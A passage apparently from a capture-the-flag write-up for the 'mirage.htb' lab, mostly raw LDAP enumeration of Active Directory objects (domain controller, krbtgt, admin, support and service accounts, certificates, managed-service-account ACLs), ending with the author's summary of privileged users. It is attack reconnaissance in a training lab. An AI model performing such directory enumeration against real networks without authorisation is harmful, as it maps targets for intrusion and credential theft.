 ydGlmaWNhdGlvbkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDTBVrPpFz2QrAL
 41LmHhHlgg9kYzAxLm1pcmFnZS5odGIwDQYJKoZIhvcNAQELBQADggEBAJoPsQE7TUxLWTzIG0Tyf
 MVzYrWgOctSo2MfUSIcN7V2rOAarvfIWpXTaJKyM6/uDHFr2H9cxLEnuSFSweNGhkjSivbi7ILzYr
 +rnl86pUB6O0npppQ1Altg57UA7Y5S9DxW6gPiKVC4OsDMGqGuFtk6cTUg4p9CNi+L03Gj21gllHt
 IzLgJ4Y50pCKs/B1G4BEhSzobv91IJ2JeIllNCDez/JSbHZln2QmCDVGHw5Kaiusa95Z1L6a73N/F
 pjDlO93UL1aZcdOmRj5ueQNTIb7xv5WCZXRUIJ3PolUZyb+VPD9KyvdFKQu9wJ3tiOIZcuT4Xax+X
 TfDrgQ3sg49bCk=
distinguishedName: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
instanceType: 4
whenCreated: 20250501074223.0Z
whenChanged: 20250720205900.0Z
uSNCreated: 12293
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=mirage,DC=htb
memberOf: CN=Cert Publishers,CN=Users,DC=mirage,DC=htb
uSNChanged: 159808
name: DC01
objectGUID:: 0wVaz6Rc9kKwC+NS5h4R5Q==
userAccountControl: 532480
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133975763105302345
localPolicyFlags: 0
pwdLastSet: 133948038212957757
primaryGroupID: 516
objectSid:: AQUAAAAAAAUVAAAAT/DJfqqf+OM1JBaZ6AMAAA==
accountExpires: 9223372036854775807
logonCount: 680
sAMAccountName: DC01$
sAMAccountType: 805306369
operatingSystem: Windows Server 2022 Standard
operatingSystemVersion: 10.0 (20348)
serverReferenceBL: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=C
 onfiguration,DC=mirage,DC=htb
dNSHostName: dc01.mirage.htb
rIDSetReferences: CN=RID Set,CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc01.mirage.ht
 b
servicePrincipalName: ldap/dc01.mirage.htb/ForestDnsZones.mirage.htb
servicePrincipalName: ldap/dc01.mirage.htb/DomainDnsZones.mirage.htb
servicePrincipalName: DNS/dc01.mirage.htb
servicePrincipalName: GC/dc01.mirage.htb/mirage.htb
servicePrincipalName: RestrictedKrbHost/dc01.mirage.htb
servicePrincipalName: RestrictedKrbHost/DC01
servicePrincipalName: RPC/9e3773da-cab7-4575-9671-1aa5524ba345._msdcs.mirage.h
 tb
servicePrincipalName: HOST/DC01/MIRAGE
servicePrincipalName: HOST/dc01.mirage.htb/MIRAGE
servicePrincipalName: HOST/DC01
servicePrincipalName: HOST/dc01.mirage.htb
servicePrincipalName: HOST/dc01.mirage.htb/mirage.htb
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/9e3773da-cab7-4575-
 9671-1aa5524ba345/mirage.htb
servicePrincipalName: ldap/DC01/MIRAGE
servicePrincipalName: ldap/9e3773da-cab7-4575-9671-1aa5524ba345._msdcs.mirage.
 htb
servicePrincipalName: ldap/dc01.mirage.htb/MIRAGE
servicePrincipalName: ldap/DC01
servicePrincipalName: ldap/dc01.mirage.htb
servicePrincipalName: ldap/dc01.mirage.htb/mirage.htb
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=mirage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20250501074223.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133975187406472608
msDS-SupportedEncryptionTypes: 28
msDS-GenerationId:: 5GKoj+eEnAI=
msDFSR-ComputerReferenceBL: CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFS
 R-GlobalSettings,CN=System,DC=mirage,DC=htb

# krbtgt, Users, mirage.htb
dn: CN=krbtgt,CN=Users,DC=mirage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: krbtgt
description: Key Distribution Center Service Account
distinguishedName: CN=krbtgt,CN=Users,DC=mirage,DC=htb
instanceType: 4
whenCreated: 20250501074223.0Z
whenChanged: 20250501080946.0Z
uSNCreated: 12324
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=mirage,DC=htb
uSNChanged: 16438
showInAdvancedViewOnly: TRUE
name: krbtgt
objectGUID:: Q3slALeRqUGXULEJnqCYrA==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133905589433472705
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAT/DJfqqf+OM1JBaZ9gEAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: krbtgt
sAMAccountType: 805306368
servicePrincipalName: kadmin/changepw
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20250501080946.0Z
dSCorePropagationData: 20250501074223.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0

# Dev_Account_A, Users, Development, mirage.htb
dn: CN=Dev_Account_A,OU=Users,OU=Development,DC=mirage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Dev_Account_A
givenName: Dev_Account_A
distinguishedName: CN=Dev_Account_A,OU=Users,OU=Development,DC=mirage,DC=htb
instanceType: 4
whenCreated: 20250502082653.0Z
whenChanged: 20250527140512.0Z
displayName: Dev_Account_A
uSNCreated: 24613
memberOf: CN=Development Team,OU=Groups,OU=Development,DC=mirage,DC=htb
uSNChanged: 102459
name: Dev_Account_A
objectGUID:: BI+z3f8CVU+h4CwKIzxEBQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
logonHours:: ////////////////////////////
pwdLastSet: 133928283125146413
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAT/DJfqqf+OM1JBaZUAQAAA==
accountExpires: 0
logonCount: 0
sAMAccountName: Dev_Account_A
sAMAccountType: 805306368
userPrincipalName: Dev_Account_A@mirage.htb
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb
dSCorePropagationData: 20250522200918.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133926680804833907

# Dev_Account_B, Users, Development, mirage.htb
dn: CN=Dev_Account_B,OU=Users,OU=Development,DC=mirage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Dev_Account_B
givenName: Dev_Account_B
distinguishedName: CN=Dev_Account_B,OU=Users,OU=Development,DC=mirage,DC=htb
instanceType: 4
whenCreated: 20250502082811.0Z
whenChanged: 20250522200918.0Z
displayName: Dev_Account_B
uSNCreated: 24625
memberOf: CN=Development Team,OU=Groups,OU=Development,DC=mirage,DC=htb
uSNChanged: 49227
name: Dev_Account_B
objectGUID:: zqtW21eW7EOlGQXdo+mdQg==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133926680844798890
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133906480915266470
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAT/DJfqqf+OM1JBaZUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Dev_Account_B
sAMAccountType: 805306368
userPrincipalName: Dev_Account_B@mirage.htb
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb
dSCorePropagationData: 20250522200918.0Z
dSCorePropagationData: 16010101000000.0Z

# david.jjackson, Users, Admins, IT_Staff, mirage.htb
dn: CN=david.jjackson,OU=Users,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: david.jjackson
givenName: david.jjackson
distinguishedName: CN=david.jjackson,OU=Users,OU=Admins,OU=IT_Staff,DC=mirage,
 DC=htb
instanceType: 4
whenCreated: 20250502082950.0Z
whenChanged: 20250721161728.0Z
displayName: david.jjackson
uSNCreated: 24641
uSNChanged: 159971
name: david.jjackson
objectGUID:: L9vwFPE9H0uZmv8Y6MCxMA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133975884116838237
pwdLastSet: 133906481900321236
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAT/DJfqqf+OM1JBaZUwQAAA==
accountExpires: 9223372036854775807
logonCount: 10
sAMAccountName: david.jjackson
sAMAccountType: 805306368
userPrincipalName: david.jjackson@mirage.htb
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb
dSCorePropagationData: 20250522203548.0Z
dSCorePropagationData: 20250522202215.0Z
dSCorePropagationData: 20250522201347.0Z
dSCorePropagationData: 20250522201327.0Z
dSCorePropagationData: 16010101000002.0Z
lastLogonTimestamp: 133975882486093917

# javier.mmarshall, Users, Disabled, mirage.htb
dn: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: javier.mmarshall
description: Contoso Contractors
givenName: javier.mmarshall
distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
instanceType: 4
whenCreated: 20250502083311.0Z
whenChanged: 20250525184443.0Z
displayName: javier.mmarshall
uSNCreated: 24655
memberOf: CN=IT_Contractors,OU=Groups,OU=Contractors,OU=IT_Staff,DC=mirage,DC=
 htb
uSNChanged: 69841
name: javier.mmarshall
objectGUID:: G3MuxcEwnEOmuQwvgE5fCA==
userAccountControl: 66050
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133926722371201785
logonHours:: AAAAAAAAAAAAAAAAAAAAAAAAAAAA
pwdLastSet: 133926722832178700
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAT/DJfqqf+OM1JBaZVAQAAA==
accountExpires: 9223372036854775807
logonCount: 13
sAMAccountName: javier.mmarshall
sAMAccountType: 805306368
userPrincipalName: javier.mmarshall@mirage.htb
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb
dSCorePropagationData: 20250522214920.0Z
dSCorePropagationData: 20250522214545.0Z
dSCorePropagationData: 20250522210251.0Z
dSCorePropagationData: 20250522200807.0Z
dSCorePropagationData: 16010714042016.0Z
lastLogonTimestamp: 133924239295082185
msDS-SupportedEncryptionTypes: 0

# mark.bbond, Users, Support, IT_Staff, mirage.htb
dn: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: mark.bbond
userCertificate:: MIIGNTCCBR2gAwIBAgITSQAAAAV0I5wrahFaTQAAAAAABTANBgkqhkiG9w0B
 AQsFADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGbWlyYWdlMRcwFQYDV
 QQDEw5taXJhZ2UtREMwMS1DQTAeFw0yNTA1MjUxODEwMDVaFw0yNjA1MjUxODEwMDVaMHcxEzARBg
 oJkiaJk/IsZAEZFgNodGIxFjAUBgoJkiaJk/IsZAEZFgZtaXJhZ2UxETAPBgNVBAsMCElUX1N0YWZ
 mMRAwDgYDVQQLEwdTdXBwb3J0MQ4wDAYDVQQLEwVVc2VyczETMBEGA1UEAxMKbWFyay5iYm9uZDCC
 ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOFJd+X61gWWdz6b8WgjdpewPOKjTJ7+rGtfM
 TarKwr+42wtaHCpdP2tVRKA9NLlQbxjfKslJLzdElfmIODYrrFQZs/n8If8LwXsvnK9qYV3PWSD31
 69F1UWSTccL9HdYsk4Xjo6hre15AtH82BlwV5s7mIAPIhFWR7h+dmkLkeCbUNqxlAHcVbUZ0SrrIR
 ilunBV1N5jM/QS0XNGPggBzcrftRcIgp1AT9iTvpxFzgs9WknPory6ER9l2XpVteNCAoHca5407jo
 yvxFBmkSt+mvJ1EU+6wgCA49JyX+0f8sI/0svs0oPszfotBogGDXAA2O1OupKZJYTOK+pcMtaFcCA
 wEAAaOCAukwggLlMB0GA1UdDgQWBBSA0bctqwHgRRvr0joies9sIgv2yDAfBgNVHSMEGDAWgBTooU
 8mN677jIcysXm/uHWrhRkQfDCByAYDVR0fBIHAMIG9MIG6oIG3oIG0hoGxbGRhcDovLy9DTj1taXJ
 hZ2UtREMwMS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
 ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1pcmFnZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY
 2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG/BggrBgEFBQ
 cBAQSBsjCBrzCBrAYIKwYBBQUHMAKGgZ9sZGFwOi8vL0NOPW1pcmFnZS1EQzAxLUNBLENOPUFJQSx
 DTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
 PW1pcmFnZSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb
 25BdXRob3JpdHkwFwYJKwYBBAGCNxQCBAoeCABVAHMAZQByMA4GA1UdDwEB/wQEAwIFoDApBgNVHS
 UEIjAgBgorBgEEAYI3CgMEBggrBgEFBQcDBAYIKwYBBQUHAwIwKwYDVR0RBCQwIqAgBgorBgEEAYI
 3FAIDoBIMEERDMDEkQG1pcmFnZS5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAE
 LlMtMS01LTIxLTIxMjcxNjM0NzEtMzgyNDcyMTgzNC0yNTY4MzY1MTA5LTExMDkwRAYJKoZIhvcNA
 QkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsOAwIHMAoGCCqGSIb3DQ
 MHMA0GCSqGSIb3DQEBCwUAA4IBAQB+uCxW8OfIrhxHq+ruP9/3qRlCDrXktpag4GJ1u81ld3TlL57
 6rdQX1OGEKAt5/yid3Y2Sd3hLQRbKERBvY3jwJnDcREGVii1jlsk7tiBnvO9MBloRll4bQwNBY8RU
 PMRiN3QR9C3SC5XYqSPouLTpZlTYOKKjUSU42QJ01awHGFsV0NHl4h9EeyiX3pViCF63gK0LdlmMG
 eaLjKWgZd99q8BSY00qMzTqx+JhyU42IUUZ3aTIgjk9Sv4syLN5gMyo4sDIo/uo0Ig7hUO0sZavqQ
 2qZnQa758e24FWVWyd1UjHw7pFm3vebrwclVtFe8Own55DHElFksUmTkKC6QbT
userCertificate:: MIIGNTCCBR2gAwIBAgITSQAAAATp2KKlRprtAQAAAAAABDANBgkqhkiG9w0B
 AQsFADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGbWlyYWdlMRcwFQYDV
 QQDEw5taXJhZ2UtREMwMS1DQTAeFw0yNTA1MjQwMTQ1NTJaFw0yNjA1MjQwMTQ1NTJaMHcxEzARBg
 oJkiaJk/IsZAEZFgNodGIxFjAUBgoJkiaJk/IsZAEZFgZtaXJhZ2UxETAPBgNVBAsMCElUX1N0YWZ
 mMRAwDgYDVQQLEwdTdXBwb3J0MQ4wDAYDVQQLEwVVc2VyczETMBEGA1UEAxMKbWFyay5iYm9uZDCC
 ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKNQw25rd8Z2lmyo5MUekAf1o33B6ICK9RiJw
 sh2MB+sflB0dLL3fDURjlpWF/aV0vtrTiajPHWa1rhc4Gf2HbkKntjVZnYsiqAPD5Dokuf8v1WUC1
 Dvqj0x66HKvdRMZMDsVqxJOBBOAwivdOkXmTApjNVAnh69asU8WoXHQJ/yUUqkQ06pb2QdpSwDkot
 76ZCoFUvygNxhGzkF7LUOI4JyGapUxIWK1JljEZlPOHi/pFqzuI4hnUDjpazgSwV4xdzRkFdW4AXc
 CZEl/6uh/FIPs6c77D8FQm1ST1yIuWLQ0mybcP6pcFFinKGEG3aap/BI7xNVO2ZoVnsi/Ya4xDcCA
 wEAAaOCAukwggLlMB0GA1UdDgQWBBRR+pbhikv+V6vdLvIIhpVsKvKqnTAfBgNVHSMEGDAWgBTooU
 8mN677jIcysXm/uHWrhRkQfDCByAYDVR0fBIHAMIG9MIG6oIG3oIG0hoGxbGRhcDovLy9DTj1taXJ
 hZ2UtREMwMS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
 ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1pcmFnZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY
 2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG/BggrBgEFBQ
 cBAQSBsjCBrzCBrAYIKwYBBQUHMAKGgZ9sZGFwOi8vL0NOPW1pcmFnZS1EQzAxLUNBLENOPUFJQSx
 DTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
 PW1pcmFnZSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb
 25BdXRob3JpdHkwFwYJKwYBBAGCNxQCBAoeCABVAHMAZQByMA4GA1UdDwEB/wQEAwIFoDApBgNVHS
 UEIjAgBgorBgEEAYI3CgMEBggrBgEFBQcDBAYIKwYBBQUHAwIwKwYDVR0RBCQwIqAgBgorBgEEAYI
 3FAIDoBIMEERDMDEkQG1pcmFnZS5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAE
 LlMtMS01LTIxLTIxMjcxNjM0NzEtMzgyNDcyMTgzNC0yNTY4MzY1MTA5LTExMDkwRAYJKoZIhvcNA
 QkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsOAwIHMAoGCCqGSIb3DQ
 MHMA0GCSqGSIb3DQEBCwUAA4IBAQAN/MbFMAk0eiSGFbflNjB8QlvjLr9deR/HR1TKN9MwyR0eRAf
 0eY34AbKJePFACX5pkOMCe6rEEdSdu10tuINckT7OafOXAl8AoreIVtX6/Nrf/6beh96Wqcqmn8qu
 WWIOyg/5zr1YZ+C6w/lFs6WqckX4FJRwNi0V21ka7Ulg9dirpifB3k0mQkQHU7c8wVY8eHTJXIJPX
 QX936cKdbVl94x9o/Or1tEFAq7zTklhuIixBq5NQGJaeqJPDOY2ySiYX07zvXaP+UITffanXuncVj
 C95mDNLioT79EHveWyjYgyp/3fTId722jI6/UuvgFtCpzyh3ea+k08SfMJAHDH
userCertificate:: MIIGNTCCBR2gAwIBAgITSQAAAAN0vFeCiOsGSAAAAAAAAzANBgkqhkiG9w0B
 AQsFADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGbWlyYWdlMRcwFQYDV
 QQDEw5taXJhZ2UtREMwMS1DQTAeFw0yNTA1MjQwMTQ1MjFaFw0yNjA1MjQwMTQ1MjFaMHcxEzARBg
 oJkiaJk/IsZAEZFgNodGIxFjAUBgoJkiaJk/IsZAEZFgZtaXJhZ2UxETAPBgNVBAsMCElUX1N0YWZ
 mMRAwDgYDVQQLEwdTdXBwb3J0MQ4wDAYDVQQLEwVVc2VyczETMBEGA1UEAxMKbWFyay5iYm9uZDCC
 ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvLTuuVhsxcTmQehsR2OWuC6HTwVC/b+Zl0p
 W0ixJNDWV/YdDmYK6Am1oqlvxOwzBrdXEgbaqzy6j7uu9o9lWSa4UYs2kcQhj9XVlpKJEv+BmzNRj
 W0w1lPxL88ltNXrwjqeai3iJaVDW0pZmD4Q6ueLUJUR7TbON1plxYv6ObC1AQBLipuvypUVXj710m
 haCuNEDykItNzepkyax/y/xH35vXMIlLWqeF+qUtOVb/ESHQfbTe/oEArv2xvhysGliOXDlJLdOh6
 dVz2X7eJ454des3ZVva1qKq8G4Cjd9Rv4gfAhwOxbjUXyp8m+Oumt9jjeY1e04mCy13qZQl52DcCA
 wEAAaOCAukwggLlMB0GA1UdDgQWBBSgGEk/O/JHvTWjQJqS8mCxr8oNhTAfBgNVHSMEGDAWgBTooU
 8mN677jIcysXm/uHWrhRkQfDCByAYDVR0fBIHAMIG9MIG6oIG3oIG0hoGxbGRhcDovLy9DTj1taXJ
 hZ2UtREMwMS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
 ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1pcmFnZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY
 2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG/BggrBgEFBQ
 cBAQSBsjCBrzCBrAYIKwYBBQUHMAKGgZ9sZGFwOi8vL0NOPW1pcmFnZS1EQzAxLUNBLENOPUFJQSx
 DTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
 PW1pcmFnZSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb
 25BdXRob3JpdHkwFwYJKwYBBAGCNxQCBAoeCABVAHMAZQByMA4GA1UdDwEB/wQEAwIFoDApBgNVHS
 UEIjAgBgorBgEEAYI3CgMEBggrBgEFBQcDBAYIKwYBBQUHAwIwKwYDVR0RBCQwIqAgBgorBgEEAYI
 3FAIDoBIMEERDMDEkQG1pcmFnZS5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAE
 LlMtMS01LTIxLTIxMjcxNjM0NzEtMzgyNDcyMTgzNC0yNTY4MzY1MTA5LTExMDkwRAYJKoZIhvcNA
 QkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsOAwIHMAoGCCqGSIb3DQ
 MHMA0GCSqGSIb3DQEBCwUAA4IBAQBCE+1xX8R1l2GwdWeiKU8uG753uEFsc43PIGne4FSpH7wZ18J
 BalkvuJOEQlhx06aLDC5zVzl3PmOTL7a1WXuRH/K1fbU+o2eAbv69KkZH6QCHIvWsZLyHMZnJDtd+
 BJy5i9oRBc0NNL5+d4glJdBJkurl+0vRk3PjmtAXVF3q0MSoj6OJAnLWnvQAukiNrccniGrcLmzQ9
 rN6b43/B0BR/ObOLe1VTyuaAievrLI7Teov+rzasvTDRHmn7cRmuOxDALdS6rQsrWL226j05iFv6H
 Kfb3whk5BzvAtlZPXbTktG1q7TOdEBSWSHoYCumbSs3muweDqFKtffe22dpAf3
givenName: mark.bbond
distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=
 htb
instanceType: 4
whenCreated: 20250502083623.0Z
whenChanged: 20250720205911.0Z
displayName: mark.bbond
uSNCreated: 24667
memberOf: CN=IT_Support,OU=Groups,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
uSNChanged: 159846
name: mark.bbond
objectGUID:: 9knredtfaEWDnTCKA4EL1A==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133975187516854953
logonHours:: ////////////////////////////
pwdLastSet: 133951870986783818
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAT/DJfqqf+OM1JBaZVQQAAA==
accountExpires: 0
logonCount: 60
sAMAccountName: mark.bbond
sAMAccountType: 805306368
userPrincipalName: mark.bbond@mirage.htb
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb
dSCorePropagationData: 20250704193640.0Z
dSCorePropagationData: 20250704193612.0Z
dSCorePropagationData: 20250522215127.0Z
dSCorePropagationData: 20250522214145.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133975187516854953

# nathan.aadam, Users, Admins, IT_Staff, mirage.htb
dn: CN=nathan.aadam,OU=Users,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: nathan.aadam
givenName: nathan.aadam
distinguishedName: CN=nathan.aadam,OU=Users,OU=Admins,OU=IT_Staff,DC=mirage,DC
 =htb
instanceType: 4
whenCreated: 20250502083654.0Z
whenChanged: 20250704200143.0Z
displayName: nathan.aadam
uSNCreated: 24674
memberOf: CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb
memberOf: CN=IT_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb
uSNChanged: 122938
name: nathan.aadam
objectGUID:: RLqOcaL9O0WOVf8L2wh07g==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133961329035117634
logonHours:: ////////////////////////////
pwdLastSet: 133951870985846674
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAT/DJfqqf+OM1JBaZVgQAAA==
accountExpires: 0
logonCount: 16
sAMAccountName: nathan.aadam
sAMAccountType: 805306368
userPrincipalName: nathan.aadam@mirage.htb
servicePrincipalName: HTTP/exchange.mirage.htb
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb
dSCorePropagationData: 20250522235531.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133961329035117634

# Mirage-Service, Managed Service Accounts, mirage.htb
dn: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
objectClass: msDS-GroupManagedServiceAccount
cn: Mirage-Service
description: Mirage Service
distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=
 htb
instanceType: 4
whenCreated: 20250502085046.0Z
whenChanged: 20250525182051.0Z
uSNCreated: 24694
uSNChanged: 69823
name: Mirage-Service
objectGUID:: SfYTE9ybJEKoy57rALFiZA==
userAccountControl: 4096
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133926708511039783
localPolicyFlags: 0
pwdLastSet: 133906494467696601
primaryGroupID: 515
objectSid:: AQUAAAAAAAUVAAAAT/DJfqqf+OM1JBaZWAQAAA==
accountExpires: 9223372036854775807
logonCount: 1
sAMAccountName: Mirage-Service$
sAMAccountType: 805306369
dNSHostName: mirage-service.mirage.htb
objectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configurat
 ion,DC=mirage,DC=htb
isCriticalSystemObject: FALSE
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133926708511039783
msDS-SupportedEncryptionTypes: 28
msDS-ManagedPasswordId:: AQAAAEtEU0sCAAAAawEAAAcAAAAaAAAAwwA6mTnu5rbWJ9kJmcmsw
 wAAAAAWAAAAFgAAAG0AaQByAGEAZwBlAC4AaAB0AGIAAABtAGkAcgBhAGcAZQAuAGgAdABiAAAA
msDS-ManagedPasswordInterval: 30
msDS-GroupMSAMembership:: AQAEgEAAAAAAAAAAAAAAABQAAAAEACwAAQAAAAAAJAD/AQ8AAQUA
 AAAAAAUVAAAAT/DJfqqf+OM1JBaZVAQAAAECAAAAAAAFIAAAACACAAA=

# svc_mirage, Service Accounts, Disabled, mirage.htb
dn: CN=svc_mirage,OU=Service Accounts,OU=Disabled,DC=mirage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc_mirage
description: Old service account migrated by contractors
givenName: svc_mirage
distinguishedName: CN=svc_mirage,OU=Service Accounts,OU=Disabled,DC=mirage,DC=
 htb
instanceType: 4
whenCreated: 20250522203745.0Z
whenChanged: 20250522203816.0Z
displayName: svc_mirage
uSNCreated: 49310
uSNChanged: 49319
name: svc_mirage
objectGUID:: lyoeV3mlg02BxexiSG72zA==
userAccountControl: 66050
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133924198657084429
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAT/DJfqqf+OM1JBaZLAoAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: svc_mirage
sAMAccountType: 805306368
userPrincipalName: svc_mirage@mirage.htb
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb
dSCorePropagationData: 20250522203745.0Z
dSCorePropagationData: 16010101000000.0Z

# search reference
ref: ldap://ForestDnsZones.mirage.htb/DC=ForestDnsZones,DC=mirage,DC=htb

# search reference
ref: ldap://DomainDnsZones.mirage.htb/DC=DomainDnsZones,DC=mirage,DC=htb

# search reference
ref: ldap://mirage.htb/CN=Configuration,DC=mirage,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 16
# numEntries: 12
# numReferences: 3
```

Got lots of information, here is the summary:
- `Administrator` - Domain Admin
- `david.jjackson` - IT_Staff/Admins (current user)
